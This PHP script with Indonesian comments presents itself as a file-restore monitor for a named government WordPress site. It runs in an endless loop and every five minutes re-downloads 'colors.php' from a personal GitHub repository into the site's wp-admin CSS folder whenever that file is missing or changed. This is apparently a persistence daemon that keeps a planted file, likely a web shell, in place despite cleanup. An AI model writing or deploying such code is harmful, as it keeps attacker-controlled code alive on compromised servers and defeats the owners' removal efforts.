<?php

// Konfigurasi file yang dipantau
$files = [
    "colors.php" => "https://raw.githubusercontent.com/matamu88/phichit1/refs/heads/main/colors.php"
];

// Lokasi folder website
$folder = "	/home/newws2081/domains/phichit1.go.th/public_html/wp-admin/css/colors/blue/";

// Fungsi untuk menghitung hash SHA256 file
function calculate_hash($filepath) {
    if (!file_exists($filepath)) {
        return null;
    }
    return hash_file('sha256', $filepath);
}

// Fungsi untuk mengunduh file dari URL
function download_file($url, $destination) {
    $content = file_get_contents($url);
    if ($content !== false) {
        file_put_contents($destination, $content);
        echo "File diperbarui: $destination\n";
    } else {
        echo "Gagal mengunduh file dari $url\n";
    }
}

// Fungsi untuk memastikan folder ada
function ensure_folder_exists($folder) {
    if (!file_exists($folder)) {
        echo "Folder $folder hilang, membuat ulang...\n";
        mkdir($folder, 0755, true);
        echo "Folder $folder telah dipulihkan.\n";
    }
}

// Fungsi untuk mengecek dan mengatur permission file
function fix_file_permissions($file_path) {
    if (file_exists($file_path)) {
        $current_permission = fileperms($file_path) & 0777;
        $expected_permission = 0644;  // File harus 0644

        if ($current_permission != $expected_permission) {
            echo "Permission file $file_path salah (" . decoct($current_permission) . "), mengubah ke 0644...\n";
            chmod($file_path, $expected_permission);
        }
    }
}

// Fungsi untuk mengecek dan memulihkan file jika hilang atau berubah
function check_and_restore_files($folder, $files) {
    ensure_folder_exists($folder);  // Pastikan folder selalu ada

    foreach ($files as $file_name => $backup_url) {
        $file_path = $folder . $file_name;

        // Cek apakah file ada
        $original_hash = calculate_hash($file_path);
        $temp_file = "/tmp/temp_file";
        download_file($backup_url, $temp_file);
        $backup_hash = calculate_hash($temp_file);

        // Jika file hilang atau berbeda hash, restore
        if ($original_hash === null || $original_hash !== $backup_hash) {
            echo "File $file_name berubah/hilang, mengembalikan ke versi asli...\n";
            download_file($backup_url, $file_path);
        }

        // Cek dan perbaiki permission file
        fix_file_permissions($file_path);

        // Hapus file sementara
        if (file_exists($temp_file)) {
            unlink($temp_file);
        }
    }
}

// Fungsi utama yang berjalan terus menerus
while (true) {
    check_and_restore_files($folder, $files);
    sleep(300);  // Cek setiap 5 menit
}
